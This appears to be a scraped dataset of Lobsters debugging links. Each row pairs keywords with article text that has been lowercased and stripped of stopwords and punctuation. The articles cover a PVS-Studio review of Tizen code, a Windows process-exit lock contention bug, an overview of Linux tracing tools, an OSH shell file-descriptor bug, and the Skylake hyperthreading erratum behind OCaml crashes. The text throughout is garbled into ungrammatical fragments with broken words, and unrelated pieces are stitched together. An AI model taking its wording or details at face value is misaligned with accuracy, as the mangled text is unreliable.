say thirdparty project mean directly stated made samsung company list project also chosen randomly much le project quantity several time larger one previously inspected total size project listed larger total size project described previous part article sure reader understands describe error detail article turn book speak small number error seemed worth taking look typo condition written left right error static void edjegeneratesourcestatemap pd mapcolorscount pd mapcolors r pd mapcolors g pd mapcolors b pd mapcolors b pvsstudio warning identical subexpressions pd mapcolors b left right operator edjeeditc software weakness type expression always false blue component rechecked instead alpha channel example show great ability pvsstudio analyzer detect various typo error identical subexpressions left right operator stdout stdout checkerstringcpp identical subexpressions revokedzsk left right operator dnssectoolc identical subexpressions left right operator ob privlast ob privlast evasoutbufc dereference potentially null pointer error total previous chapter discussed null pointer dereference spoke potentially null pointer returned function malloc strdup word case luck program could work correctly let take look case great null pointer get dereferenced static iscresultt setupstyle dnsmasterstylet stylep iscresultt result dnsmasterstylet style null require stylep null stylep null pvsstudio warning dereferencing null pointer stylep might take place check logical condition delvc software weakness type null pointer dereference check written incorrectly pointer null dereferenced apparently programmer planned write check require stylep null stylep null type error rare error show quickly general diagnostics detect pointer null certain condition already considered situation earlier remaining warning pointing error put file function return random value error following error interesting written patch tizen developer apply thirdparty library get required functionality static einabool ipcserverdata void data int type einaunused void event tizenonly add skipping indicator buffer logic indicatorbufferskip return end pvsstudio warning nonvoid function return value ecoreevasextnc software weakness type return wrong status code function return incorrect status random value einabool type error nonvoid function return value lsorthpp nonvoid function return value ecoreevasextnc using freed memory error static char readlinepathgenerator const char text int state ctx null char c realloc child strlen child strlen ctx c null return null int ctxidx strlen ctx child ctxidx sep ctxidx strcpy c child ctxidx child c analyzer warning child pointer used memory reallocated augtoolc child pointer used memory reallocated augtoolc software weakness type use free code completely incorrect sometimes may work successful call realloc function pointer child becomes invalid longer used say work time thing memory manager return buffer address used ie buffer size increase without change address way memory manager optimizes speed need copy data old buffer new one error re pointer used memory released samplerequestc re pointer used memory released sampleupdatec re pointer used memory released sampleupdatec typo identical code block error void config del first entry tmp first next delete first first tmp others entry tmp others next delete first others tmp pvsstudio warning two similar code fragment found perhaps typo others variable used instead first configcpp software weakness type improper release memory removing last reference memory leak beautiful copypaste error found author copied text block forgot change variable name one fragment first loop variable first nullptr value mean execution second loop nothing deleted multiple memory leak occur condition always truefalse stylelinetype styleline gettype void unsigned int spos epos epos mlinelength epos isspace mline epos epos pvsstudio warning expression epos always true unsigned type value always scimanthystylefilecpp software weakness type expression always true hard notice error code quickly reviewing fragment error epos unsigned variable mean statement epos always true due error code protected situation string mline becomes empty string empty epos variable uintmax result access array mline epos lead unpleasant consequence error expression always false pcmextplugc expression always false pcmextplugc expression always false pcmextplugc expression always false pcmextplugc expression always false pcmioplugc expression always false pcmioplugc expression pathposend always true unsigned type value always newfmodecpp expression epos always true unsigned type value always scimanthystylefilecpp private data cleared error made interesting conclusion reviewed code samsung found one error clearing private data thirdparty library full error think serious omission since matter part program erroneous private data remain somewhere memory someone use review two fragment code article bag typical void ctx unsigned char digest sizet len unsigned char opad unsigned char newdigest memset newdigest sizeof newdigest pvsstudio warning compiler could delete memset function call used flush newdigest buffer memsets function used erase private data hmacshac software weakness type compiler removal code clear buffer private data stored buffer newdigest erased let look another function unlike example described previously buffer created stack heap memory static void eiconsmartdel evasobject obj esmartdata sd sd evasobjectsmartdataget obj return evasobjectdel sd obj evasobjectdel sd eventarea evasobjectsmartdataset obj null memset sd sizeof sd free sd pvsstudio warning compiler could delete memset function call used flush sd object memsets function used erase private data eiconc software weakness type compiler removal code clear buffer pointer sd still used resetting memory passed fee function however mean anything compiler may remove function call memset optimization look another warning indicating error file issue error still many undescribed error left code sure reader agree time conclude done diligent work introduced result article elephant size however interesting thing left screen list type error perhaps operator work different way expected operator lower priority foo operator error alloca function used inside loop quickly overflow stack error use else pattern detected probability logical error presence error x variable assigned value twice successively perhaps mistake error statement equivalent else statement error odd pointer compared zero value probably meant ptr zero error expression always truefalse error value different enum type compared error recurring check condition already verified previous line error incorrect format consider checking n actual argument foo function error consider inspecting expression expression excessive contains misprint error consider reviewing expression b c kind expression calculated following b c error pointer utilized verified nullptr check line error odd implicit type casting error divide mod zero error undefined behavior check shift operator error expression implicitly cast integer type real type consider utilizing explicit type cast avoid overflow loss fractional part error code operational logic correspond formatting error function call could lead buffer overflow bound contain size buffer number character hold error consider inspecting application logic possible else keyword missing error two statement identical conditional expression first statement contains function return mean second statement senseless error consider inspecting nn argument function foo possible value correspond length string passed yy argument error sense testing pointer null memory allocated using new operator exception generated case memory allocation error error sense testing pointer null memory allocated using new operator exception generated case memory allocation error error class implement copy constructoroperator lack operatorcopy constructor error condition ptr constvalue false value pointer equal magic constant error realloc possible leak realloc fails allocating memory original pointer lost consider assigning realloc temporary pointer error two identical text block detected second block start nn string error pointer expression equal nullptr resulting value meaningless used error function exited without releasing pointerhandle memoryresource leak possible error unreachable code detected possible error present error warning found following file tizenthirdpartyotherthingstxt intermediate total error found presentation error stated apparently forgot count line code analyzed comment pvsstudio detects error line code mean alleged error density thirdparty library slightly lower error density code tizen analyzer detected error line code error density lower library may studied code le attentively noticed error library already regularly checked using coverity analyzer error caused fact small part project studied reason point pay attention difference say density error two group project approximately equal overall result programming static analysis finished time statistic looked article without reading repeat talking number warning displayed analyzer actual error say analysis found error mean found exactly bug number warning saw doubt suggest read article beginning apologize repeating thing extremely important unfortunately many people perceive incorrectly information article presentation confusing number warning number error summary table list type error quantity identical subexpressions left right foo operator perhaps operator work different way expected operator lower priority foo operator nonsensical comparison pointer alloca function used inside loop quickly overflow stack pointer local array x stored outside scope array pointer become invalid call foo function lead buffer overflow underflow use else pattern detected probability logical error presence x variable assigned value twice successively perhaps mistake dereferencing null pointer might take place statement equivalent else statement odd body function fully equivalent body function odd zero value assigned pointer probably meant ptr zero odd pointer compared zero value probably meant ptr zero variable x used loop outer loop expression always truefalse value different enum type compared part conditional expression always truefalse recurring check condition already verified previous line odd object created using new operator immediately cast another type function receives odd argument incorrect format consider checking n actual argument foo function consider inspecting expression expression excessive contains misprint nonvoid function return value consider reviewing expression b c kind expression calculated following b c pointer utilized verified nullptr check line compiler could delete memset function call used flush foo buffer rtlsecurezeromemory function used erase private data odd implicit type casting divide mod zero undefined behavior check shift operator memory allocation deallocation method incompatible uninitialized variable foo used dangerous call foo function manner line passed could contain format specification example safe code printf str consider inspecting switch statement possible first case operator missing constant nn utilized resulting value could inaccurate consider using mnn constant mathh expression implicitly cast integer type real type consider utilizing explicit type cast avoid overflow loss fractional part code operational logic correspond formatting saving function result inside byte type variable inappropriate significant bit could lost breaking program logic function call could lead buffer overflow bound contain size buffer number character hold consider inspecting application logic possible else keyword missing value type assigned pointer b type two statement identical conditional expression first statement contains function return mean second statement senseless consider inspecting nn argument function foo possible value correspond length string passed yy argument sense testing pointer null memory allocated using new operator exception generated case memory allocation error expression contains suspicious mix integer real type writing readonly memory pattern detected expression excessive contains logical error class implement copy constructoroperator lack operatorcopy constructor inappropriate attempt append null character string determine length string strlen function correctly string ending null terminator used first place condition ptr constvalue false value pointer equal magic constant continue operator terminate false loop condition always false realloc possible leak realloc fails allocating memory original pointer lost consider assigning realloc temporary pointer type slicing exception caught reference rather value violated order exception handler exception caught handler base class two identical text block detected second block start nn string consider inspecting virtual function argument see nn argument function foo derived class base class pointer expression equal nullptr resulting value meaningless used function exited without releasing pointerhandle memoryresource leak possible pointer used memory released two similar code fragment found perhaps typo x variable used instead unreachable code detected possible error present object nonpassive nonpds type used function dereferencing invalid iterator x might take place assigning value c x variable look suspicious value range variable b table type number error found randomly selected project detected error total let round error simplicity false positive evaluate number false positive thing performed even minimal analyzer configuration point count percentage false positive simply dishonest towards analyzer majority false positive appears several failed macro setting analyzer one reduce several time number false positive judging personal feeling many false positive would able undertake alone extensive study quickly addition note number false positive matter start cooperation false positive headache team tizen developer error moment come become clear stated error total analyzed line code excluding comment detected error whole tizen project thirdparty library line c c code excluding comment mean checked code estimation using pvsstudio detect fix error see calculation absolutely fair transparent conclusion think managed demonstrate ability pvsstudio detect various type error though article long one say embellish pvsstudio fantasize error article present data evaluation anyone verify static analysis must come large project tizen also make sense use tool since different analyzer complement suggest download try pvsstudio supported language compiler window visual studio c c ccli ccx winrt c window visual studio c c ccli ccx winrt c window visual studio c c ccli ccx winrt c window visual studio c c ccli ccx winrt c window visual studio c c ccli c window mingw c c windowslinux clang c c linux gcc c c thank attention invite read analysis open source project subscribe twitter codeanalysis respectfully andrey karpov
423,Lobsters,debugging,Debugging,24-core CPU and I can’t move my mouse,https://randomascii.wordpress.com/2017/07/09/24-core-cpu-and-i-cant-move-my-mouse/,cpu move mouse,often followup post available cpu usage precise manually followed wait chain cpu usage sampled hyperthreads idle amdahl law reboot machine one resource available followup post found http newsycombinatorcomitem http http http http http langen self inflicted denial service visual studio search cpu type email part one like,story begin often noticed machine behaving poorly window work machine core hyperthreads idle gb ram le half used fast ssd mostly idle yet moved mouse around kept hitching sometimes locking second time update july followup post dissects problem find root cause update oct video showing see bug fixed found bug fixed insider preview build update nov fix made creator update mean build chrome without encountering microhangs update march fix made fall creator update finally fix everywhere update august analysis unrelated bug also caused ui hang due lock contention available always grabbed etw trace analyzed result discovery serious processdestruction performance bug window etw trace showed ui hang multiple program decided investigate hang task manager image see cpu usage system hang grouped process name notice total cpu usage rarely go cpu usage precise table showed task manager ui thread repeatedly blocked call function like sendmessagew apparently waiting kernel critical region kernelmode version critical section deep call stack entercrit shown manually followed wait chain halfdozen process see hogging lock note analysis look something like taskmgrexe hung msgcheckdelay thread longest delay m entercrit readied conhostexe thread conhostexe readied waiting m mstscexe mstscexe readied time delay tabtipexe readied uiforetwexe readied conhostexe readied gomaccexe readied gomaccexe keep going process releasing lock holding microsecond eventually found several process gomaccexe process looked like holding lock hundred microsecond least readied somebody holding lock hundred microsecond later readied somebody else releasing lock process releasing lock within ntgdicloseprocess tired manually following wait chain decided see readying call stack showing lot time dragging ready thread stack column left searching column ntgdicloseprocess used wpa view caller function option show ready thread stack went function view stack root bottom context switch ntgdicloseprocess ready thread stack one representing time critical region released thread readied call stack waiting combined total second pretty impressive second period readying event happened thread held lock microsecond readying event would enough account second hang familiar part window combination pspexitthread ntgdicloseprocess made clear behavior happening process exit happening build chrome build chrome creates lot process using distributed build system mean process created destroyed quite quickly next step find much time spent inside ntgdicloseprocess moved cpu usage sampled table wpa got butterfly graph time callees ntgdicloseprocess see screen shot period across entire system m time spent inside ntgdicloseprocess representing wall time anytime lock held time one function bad place especially lock must acquired order call getmessage update mouse position order experiment better wrote test program creates process quickly possible wait half second tell process exit simultaneously cpu usage test program fourcore eightthread home laptop grouped process name seen well know process creation cpu bound process shutdown however cpu bound beginning end long period middle second serialized using one eight hyperthreads system process fight single lock inside ntgdicloseprocess serious problem period represents time program hang mouse movement hitch sometimes serialized period several second longer noticed problem seems worse computer running rebooted ran test soon laptop settled processshutdown serialization indeed le severe issue still clearly present freshly rebooted machine ran test old window machine intel core circa see result process creation slower would expect much slower cpu process destruction fast new laptop best fully parallelized tell u serialization process shutdown new issue introduced sometime window window hyperthreads idle amdahl law say throw enough core problem part parallelized eventually dominate execution work machine heavily used day serialization issue get bad enough processshutdown becomes significant part distributed build time core help order get maximum build speed want move mouse build need reboot machine every day even build speed fast window start look tempting fact adding core workstation make ui le responsive chrome build system smart enough spawn process core mean terminating process fighting global lock cpu move mouse cpu therefore move mouse problem reported microsoft investigating one process create test program look like run work machine see tiny horizontal red line bottom right amdahl law visualized machine cpu resource sit idle almost two second process destruction hog lock need order move mouse beforeafter trace march date fix made fall creator update image show processdestruction portion processcreatetestsexe clearly see serialization one four core allowed run time image perfect parallelization much better performance image horizontal time scale image resource processcreatetests code available deeper investigation function hog lock done followup post including understanding likely root cause new problem video showing investigate bug found discussion post found http newsycombinatorcomitem http http popular russian translation http http http langen liked post might like investigative reporting post self inflicted denial service visual studio search cpu type email part one like like loading related
424,Lobsters,debugging,Debugging,Linux tracing systems & how they fit together,https://jvns.ca/blog/2017/07/05/linux-tracing-systems/,linux tracing system fit together,suchakra polytechnique montréal data source mechanism collecting data source tracing frontends picture version trace data source kprobes tracepoints uprobes dtrace probe probe tracepoint kprobes lwn article instruction inside kernel inspect register brendan gregg script uprobes brendan gregg good post email protected usdtdtrace probe python dtrace probe tell dtrace probe python doc paper kernel tracepoints lwn article lttngust mechanism collecting delicious delicious data ftrace perfevents ebpf bcc sysdig file systemtap architecture document relayfs something choosing linux tracer lttng lttng trace compass frontends perf frontends ftrace frontends tracecmd blog post article lwn catapult kernelshark perf ebpf frontends bcc bcc http githubcomiovisorbcc post ebpf relationship bpf packet filtering day lttng systemtap frontends trace compass hope helped brendan gregg,confused linux tracing system year strace ltrace kprobes tracepoints uprobes ftrace perf ebpf fit together mean last week went paper love later kamal hung suchakra polytechnique montréal lttng come finally think understand piece fit together le still probably mistake post please let know twitter going leave strace post even though favorite thing overhead high post going talk tracing system relatively fast low overhead post also sampling profilers whole topic tracing thing learned last week helped really understand split linux tracing system data source tracing data come mechanism collecting data source like ftrace tracing frontends tool actually interact collectanalyse data overall picture still kind fragmented confusing least approachable fragmentedconfusing system talk link want jump specific section still kind complicated breaking way really help understand thanks brendan gregg suggesting breakdown twitter picture version drawing summarizing post trace different kind thing might want trace system call linux kernel function call function tcp stack called userspace function call malloc get called custom event defined either userspace kernel thing possible turn tracing landscape actually pretty complicated data source kprobes tracepoints uprobes dtrace probe okay let data source kind fun part many exciting place get data program going split probe kprobesuprobes tracepoints usdtkernel tracepoints lttngust think using right terminology exactly distinct idea useful understand probe kernel dynamically modifies assembly program runtime like change instruction order enable tracing super powerful kind scary enable probe literally instruction program tracing though dtrace probe probe sense kprobes uprobes example pattern tracepoint something compile program someone using program want see tracepoint hit extract data enable activate tracepoint start using generally tracepoint sense cause extra overhead activated relatively low overhead activated usdt dtrace probe lttngust kernel tracepoints example pattern kprobes next kprobes lwn article kprobes debugging mechanism linux kernel also used monitoring event inside production system use weed performance bottleneck log specific event trace problem etc reiterate basically kprobes let dynamically change linux kernel assembly code runtime like insert extra assembly instruction trace given instruction called usually think kprobes tracing linux kernel function call actually trace instruction inside kernel inspect register weird right brendan gregg kprobe script use play around kprobes example let use kprobes spy file opened computer ran sudo kprobe p myopen dosysopen si string example right away started printing every file opened computer neat notice kprobes interface little gnarly though like know filename argument dosysopen si register dereference pointer tell kprobes system string think kprobes useful scenario tracing system call system call corresponding kernel function like dosysopen debugging performance issue network stack file io understand kernel function called well enough useful trace impossible linux kernel code kernel developer otherwise trying debug kernel bug happens sometimes kernel developer uprobes uprobes kind like kprobes except instead instrumenting kernel function instrumenting userspace function like malloc brendan gregg good post understanding uprobes work decide want trace malloc function libc ask linux kernel trace malloc libc linux go find copy libc loaded memory one shared across process change code malloc traced linux report data back somehow talk asking linux getting data back somehow work later pretty cool one example thing spy people typing bash terminal email protected cperftools sudo binuprobe r bash readline retval string tracing uprobe readline r readline retval string ctrlc end readline hi readline fault readline hi readline yay readline wow readline coolcommand usdtdtrace probe usdt stand userland statically defined tracing usdt probe mean thing dtrace probe surprising might heard dtrace bsdsolaris actually also use dtrace probe linux though system different basically way expose custom event example python dtrace probe compile right pythonfunctionentry str filename str funcname int lineno frameptr mean tool consume dtrace probe like ebpf systemtap version python compiled dtrace support automagically trace python function call really cool though little bit python compiled dtrace support version python ubuntu seem tell dtrace probe python doc basically poke around binary readelf look string stap note readelf python grep notestapsdt notestapsdt note sometimes need look file instead binary readelf grep notestapsdt notestapsdt note readelf n python want read dtrace read paper actually sure best reference kernel tracepoints tracepoints also linux kernel lwn article system written mathieu desnoyers montreal basically traceevent macro let define tracepoints like one something queue failure traceevent udpfailqueuercvskb tpproto int rc struct sock sk tpargs rc sk tpstructentry field int rc field lport really understand work think pretty involved basically tracepoints better kprobes stay constant across kernel version kprobes depend whatever code happens kernel time worse kprobes somebody write explicitly lttngust understand lttng super well yet understanding thing dtrace probe kprobes uprobes tracepoints need go kernel point lttngust tracing system let compile tracing probe program tracing happens userspace mean faster context switching still used lttng time mostly going say mechanism collecting delicious delicious data understand frontend tool use collect analyze tracing data important understand fundamental mechanism tracing data get kernel grubby hand ftrace perfevents ebpf systemtap lttng let start actually part core linux kernel ftrace perfevents ebpf ftrace kprobe uprobe script use ftrace get data kernel ftrace kind janky interface pain use directly basically filesystem syskerneldebugtracing let get various tracing data kernel way fundamentally interact ftrace write file syskerneldebugtracing read output file syskerneldebugtracing ftrace support kprobes tracepoints uprobes think ftrace output look like pain parse build top readline hi readline fault readline hi readline yay readline wow readline perfevents second way get data kernel perfeventopen system call way work call perfeventopen system call kernel writes event ring buffer user memory read far tell thing read way tracepoints running sudo perf trace tracepoint every system call ebpf ebpf exciting way get data work write ebpf program often c likely use tool generates program ask kernel attach probe kprobeuprobetracepointdtrace probe program writes data ebpf map ftrace perf buffer precious precious data ebpf cool part linux install kernel module define program fancy aggregation want really powerful usually use bcc frontend talk bit later available newer kernel though kernel version need depends data source want attach ebpf program different ebpf feature available different kernel version slide awesome summary sysdig sysdig kernel module tracing system let trace system call maybe thing find site kind confusing navigate think file contains list event sysdig support tell file opened weird internal detail tcp stack systemtap little fuzzy systemtap work going go architecture document decide want trace kprobe write systemtap program compile kernel module kernel module inserted creates kprobes call code kernel module triggered call registerkprobe kernel module print output userspace using relayfs something systemtap support tracepoints kprobes uprobes usdt basically lot thing useful word systemtap choosing linux tracer lttng lttng linux tracing next generation montreal lab ecole polytechnique make super happy montreal saw amazing demo tool called trace compass day read data come lttng basically able show schedswitch transition program system call running tar xzf somefiletargz could really see exactly happening super clear way downside lttng like systemtap install kernel module kernel part work lttngust everything happens userspace kernel module needed frontends okay time frontends going categorize mechanism data get kernel make easier perf frontends frontend perf simple perf trace trace system call fast great love perf trace one actually use day day right ftrace stuff powerful also confusing difficult use ftrace frontends ftrace pain use various frontend tool help found best thing use yet starting point tracecmd frontend ftrace use collect display ftrace data wrote bit blog post article lwn catapult let analyze ftrace output android chrome performance originally also analyze ftrace far thing gotten graph schedswitch event know process running time exactly cpu pretty cool really use yet kernelshark consumes ftrace output tried yet perf command line tool perf frontend confusingly also frontend ftrace functionality see perf ftrace ebpf frontends bcc know bcc framework http githubcomiovisorbcc let write ebpf program insert kernel help get data kernel process python script pretty easy get started curious relationship ebpf bpf use tcpdump wrote post ebpf relationship bpf packet filtering day think might easiest though think unrelated ebpf much powerful bcc bit weird write c program inside python program lot example kamal wrote program bcc day first time pretty easy lttng systemtap frontends lttng systemtap set tool really understand said cool graphical tool called trace compass seems really powerful consumes trace format called ctf common trace format lttng emits kind think right though note figured stuff fit together recently expert mostly interested computer running kernel linux probably learn ebpf perf trace good trace system call low overhead super simple much learn everything else well investment take time get used think playing kprobes good idea via ebpfftracesystemtaplttngwhatever right ftrace easiest able know going kernel good superpower ebpf available kernel version feature think make sense invest learning older system help yet ftrace kind huge pain think would worth could find good frontend tool managed yet hope helped really excited mostly understand piece fit together literally typing post free show jazz festival listening blue fun time know everything fit together think much easier time navigating landscape tracing frontends brendan gregg awesome blog discus ton topic lot detail interested hearing improvement linux tracing ecosystem happen always changing best place subscribe thanks annie cherkaev harold treen iain mccoy david turner reading draft
425,Lobsters,debugging,Debugging,Gagallium : How I found a bug in Intel Skylake processors,http://gallium.inria.fr/blog/intel-skylake-bug/,gagallium found bug intel skylake processor,first sighting see description undefined behavior security hole broken benchmark address space layout randomization second sighting ahrefs caml consortium pr blog post link revelation link generation processor family specification update epilogue detailed instruction lwt coq coccinelle ar technica hothardware hardware news,instructor course know student willing blame failure program anything sorting routine discard half data might window virus binary search always fails java compiler acting funny today experienced programmer know well bug generally code occasionally thirdparty library rarely system library exceedingly rarely compiler never processor thought recently ran bug intel skylake processor trying debug mysterious ocaml failure first sighting late april shortly ocaml released serious industrial ocaml user siou contacted privately bad news one application written ocaml compiled ocaml crashing randomly every run would segfault different place within code moreover crash observed recent computer running intel skylake processor skylake nickname latest generation intel processor time latest generation time writing nicknamed kaby lake many ocaml bug reported last year report particularly troubling skylake processor indeed reproduce crash using binary computer inria running older intel processor lack reproducibility application singlethreaded made network io file io execution perfectly deterministic whatever bug caused segfault cause every run place code first guess flaky hardware siou bad memory chip overheating speaking personal experience thing happen result computer boot run gui fine crash load suggested siou run memory test underclock processor disable hyperthreading ht ht suggestion inspired earlier report skylake bug involving avx vector arithmetic would show ht enabled see description siou take suggestion well arguing correctly running cpu memoryintensive test skylake machine one written ocaml would crash clearly thought hardware perfect bug software great still managed cajole running memory test came back clean suggestion turning ht ignored bad would saved u much time parallel siou conducting impressive investigation varying version ocaml c compiler used compile runtime system operating system verdict came follows ocaml including early beta c compiler gcc clang o linux window macos since macos us clang used gccbased window port finger firmly pointed ocaml gcc surely siou reasoned ocaml runtime system piece bad c code undefined behavior say business causing gcc generate machine code crash c compiler allowed presence undefined behavior would first time gcc treat undefined behavior least possibly helpful way see instance security hole broken benchmark explanation plausible still failed account random nature crash gcc generates bizarre code based undefined behavior still generates deterministic code source randomness could think address space layout randomization aslr o feature cause absolute memory address change run run ocaml runtime system us absolute address place egâ index hash table memory page however crash remained random turning aslr particular running gdb debugger early may turn get hand dirty siou subtly hinted giving shell account famous skylake machine first attempt build debug version ocaml planned add even debugging instrumentation later rebuild application version ocaml unfortunately debug version would trigger crash instead worked executable provided siou first interactively gdb nearly drove crazy wait sometimes one hour trigger crash using little ocaml script ran program time saved core dump produced every crash debugging ocaml runtime system fun postmortem debugging core dump atrocious analysis core dump showed segfaults occur different place two within ocaml gc within application popular place crash markslice function gc case ocaml heap corrupted wellformed data structure contains bad pointer ieâ pointer point first field caml block instead point header inside middle caml block even invalid memory already freed crash markslice caused pointer two word ahead block size symptom consistent familiar mistake ocamlopt compiler forgetting register memory root gc however mistake would cause reproducible crash depending allocation gc pattern completely failed see kind memory management bug ocaml could cause random crash lack better idea listened voice back head whispering bug vague impression crash happened frequently machine loaded would case overheating issue test theory modified ocaml script run n copy program parallel run also disabled ocaml memory compactor resulting bigger memory footprint gc activity result expected striking nonetheless failure failure failure failure failure failure failure failure failure number failure given run test program notice jump n n plateau higher value n explain number need give information test skylake machine physical core logical core since ht enabled two core busy two longrunning test mine background otherwise machine much hence system load n epsilon n number test ran parallel active process time o scheduler spread evenly physical core machine try hard schedule two process two logical core physical core would result underutilization resource physical core case n also time n number active process grows o start taking advantage ht scheduling process two logical core physical core case n logical core machine busy o performs traditional timesharing process case n n experiment evident crash happened hyperthreading kicked precisely ocaml program running along another hyperthread logical core physical core processor wrote siou back summary finding imploring entertain theory hyperthreading time listened turned hyperthreading machine crash gone good two day testing loop showed issue whatsoever problem solved yes happy ending yet neither siou tried report issue intel others siou satisfied workaround consisting compiling ocaml clang want publicity product crash randomly kind tired problem know report thing intel public issue tracker like rest u suspected problem specific machine siou egâ batch flaky chip got put wrong speed bin accident second sighting year went without anyone else reporting sky exactly skylake falling ocaml gladly forgot little episode siou went making horrible pun january enguerrand decorne joris giovannangeli ahrefs another serious industrial ocaml user member caml consortium boot report mysterious random crash ocaml pr caml bug tracker repro case provided ocamloptopt compiler sometimes crash produce nonsensical output compiling large source file particularly surprising since ocamloptopt ocaml program compiled ocamloptbyte compiler mades easier discus reproduce issue public comment pr show rather well happened next ahrefs people wrote detailed story bug hunt blog post highlight turning point story twelve hour opening pr already comment discussion enguerrand decorne report machine able reproduce issue running cpu intel skylake day mention random crash siou suggest disable hyperthreading day joris giovannangeli confirms crash reproduced hyperthreading disabled parallel joris discovers crash happens ocaml runtime system built gcc gcc retrospect explains absence crash debug ocaml runtime ocaml built gcc default go limb post following comment crazy imagine gcc ocaml runtime produce specific instruction sequence cause hardware issue steppings skylake processor hyperthreading perhaps crazy hand already one documented hardware issue hyperthreading skylake link mark shinwell contact colleague intel manages push report intel customer support nothing happened month revelation may user post link following changelog entry debian package new upstream microcode datafile likely fix nightmarelevel skylake erratum fortunately either erratum verylowhitting gccclangiccmsvc wo nt usually issue affected opcode pattern end rare short loop using ahbhchdh register corresponding wide register may result unpredictable system behavior requires logical processor core ie sibling hyperthreads active trigger well complex set microarchitectural condition documented intel april described page generation processor family specification update similar erratum go name variant skylake architecture newer kaby lake architecture part intel description sound right despite rather vague description set microarchitectural say erratum ring bell hyperthreading required check trigger pseudorandomly check involve floatingpoint vector instruction check plus microcode update work around erratum available nicely packaged debian ready apply test machine hour later joris giovannangeli confirms crash gone upgrading microcode run test shiny new skylakebased workstation courtesy procurement come conclusion since test crash le minute old microcode run day without problem updated microcode another reason believe culprit problematic code pattern outlined erratum generated gcc compiling ocaml runtime system example byterunmajorgcc function sweepslice c code like hd hdhp hp hdhp hp whitehdhd hd macroexpansion becomes hd hp hp hd clang compile code obvious way using fullwidth register movq rbx rax andq rax imm movq rax rbx however gcc prefers use ah register operate upon bit full register rax leaving bit unchanged movq rdi rax andb ah movq rax rdi two code functionally equivalent one possible reason choice code compact constant fit byte code constant need byte code rate code generated gcc use rax ah depending optimization level bad luck code could end loop small enough trigger bug end hardware bug told epilogue intel released microcode update skylake kaby lake processor fix work around issue debian detailed instruction check whether intel processor affected obtain apply microcode update timing publication bug release microcode update right several project written ocaml starting observe mysterious random crash example lwt coq coccinelle hardware bug making round technical web site see example ar technica hothardware hardware news
426,Lobsters,debugging,Debugging,OSH Runs Real Shell Programs,http://www.oilshell.org/blog/2017/07/02.html,osh run real shell program,blog oilshellorg osh run real shell program hardest bug ever osh appendix autoconf bash essentially identical bash use test trickiest bug output obvious suspect innocent file descriptor table restore broke debugging tool changed bug different night watch reddit meaningfully reduce test case autoconf deterministic opy solution asdl asdl implementation github commit analysis takeaway kernel chooses shell pipeline inherent conflict hardcoded file descriptor fdcloexec debootstrap autoconf leave comment conclusion working toward osh release appendix gnu autoconf work autoconf wikipedia article,blog oilshellorg osh run real shell program fixed hardest bug ever osh run significant shell script nt write python autogenerated configure script related configstatus script appendix explains autoconf generates file ran program bash osh compared respective output file essentially identical handful oneline difference appear due autoconf checking bashversion optional behavior although configure script use quirky subset posix shell opposed full bash language happy reach milestone end use test mentioned want write post called long slog shell give sense filled osh runtime since last bug happened hardest one ever one let run real shell program worth writing spoiler fixed simply calling close couple file silly bug trivial fix unfortunately typical bug cost lot time trickiest bug osh bash execution configstatus stopped error message following line sed accr devnull devnull code redirects stdin stdout stderr sed devnull suspected execution nt actually halt rather script continued executing output explaining fix bug tricky obvious suspect innocent shell take three step execute something like echo hi apply redirect process state using fcntl system call modify file descriptor table process execute echo hi restore file descriptor table observed behavior could easily explained bug step nt restore state correctly output would continue go devnull convinced bug code spent lot time instrumenting mentally tracing bug totally different place could say action distance broke debugging tool debug redirect code added print statement usually bug inherently broken print statement script unexpectedly stopped printing message console program output debug print statement debugging bug changed bug work around problem tried opening separate disk file debug message triggered unhandled exception different part program still nt understand exactly happened opening file change file descriptor table surprising reminded james mickens hilarious article night watch pdf popped reddit tool destroyed tool tool attempt meaningfully reduce test case failed cut script script contained last statement smaller script failed reproduce bug attempting read line shell generated autoconf fun saving grace bug completely deterministic reminds hit tough nondeterministic bytecode generation bug developing opy painstakingly tracing wrong code able log message slowed lot got stuck moved onto thing awhile solution many failed debugging session idea look proc pidfd directory nt recall using much seems essential saw extra file open l l total lrwx andy andy jul lrwx andy andy jul lrwx andy andy jul lrx andy andy jul homeandygitoilcoreruntimeasdl lrx andy andy jul homeandygitoiloshoshasdl lrx andy andy jul devurandom oops descriptor open connected two asdl schema using oil asdl implementation generates class startup time asdl schema need open two file also remembered one line configstatus exec conflict descriptor looked like culprit tried simply closing file problem went away github commit kicking waste time hand learned thing hard way analysis takeaway unix calling open return file descriptor kernel chooses descriptor still open child process fork exec must case otherwise could nt properly set shell pipeline child program us hardcoded file descriptor happens one kernel assigned eg exec inherent conflict program misbehave found misbehavior hard diagnose understand bug nt understand shell program use hardcoded file descriptor seems like bad idea implicit part calling contract documented know fdcloexec flag file descriptor cause closed upon exec unix shell including osh use flag save file descriptor table generally index greater nevertheless still confused shell programming technique encountered debootstrap shell script autoconf generates please leave comment use seen technique conclusion post described last bug fixed also happened one enabled run first significant shell program nt write toward end long period filling shell runtime mentioned working toward osh release next post go back time document beginning period appendix gnu autoconf work developer machine autoconf generates portable configure shell script configureac contains handwritten macro configure distributed source tarball user unpack source tarball machine run configure inspects system value generates configstatus shell script run typically produce configh makefile python case also file like modulessetupconfig see autoconf wikipedia article nice diagram
427,Lobsters,debugging,Debugging,Skylake bug: a detective story,https://medium.com/ahrefs/skylake-bug-a-detective-story-ab1ad2beddcd,skylake bug detective story,skylake bug detective story debian mailing list various social medium news outlet ocaml ahrefs list erratum published manufacturer mantis issue blog post setting scene tracking crash ocaml ocaml two backend implementation issue ocaml bugtracker set strange lead asan ubsan hardware unusual suspect ocaml changelog identifying offending code ocaml irc ssa form mitigating issue opam happy end debian package update intelmicrocode,skylake bug detective storyit dark stormy night skylake cpu buzzed excitement suddenly hyperthreads started lock something like thatthis week new erratum intel skylake kabylake processor family brought public attention debian mailing list various social medium news outletswe investigating issue since january core ocaml team struggling mysterious bug affecting developer machine ultimately production system resulting corruption important data databasesat ahrefs operate fleet thousand server running wide variety service huge web crawler among others scale dealing unexpected application behavior common try reduce probability software functioning expected bug sadly real part everyday life even though assume underlying hardware running infrastructure thought reliable le prone bug software component issue still arise unexpected way number server increase unusual observe fault hardware preventing system functioning specifiedit certainly frequent encounter problem cpu reading list erratum published manufacturer cpu model contains fair amount bug story bug microcode skylake processor leading incorrect code execution certain condition certainly scary first sight trust system trust main component yet like software bug processor defect identified contained take action prevent impacting operation infrastructurewe know full implication particular bug especially security implication case untrusted code execution like tell story erratum point view provide context show dealing much different dealing usual software flaw post aim cover perspective adventure would like thank mark shinwell xavier leroy frédéric bour everyone involved mantis issue ocaml irc channel help time spent investigating u update xavier leroy told side story another blog postsetting sceneour story start late backend developer received new laptop work day enguerrand decorne noticed unusual crash compilation 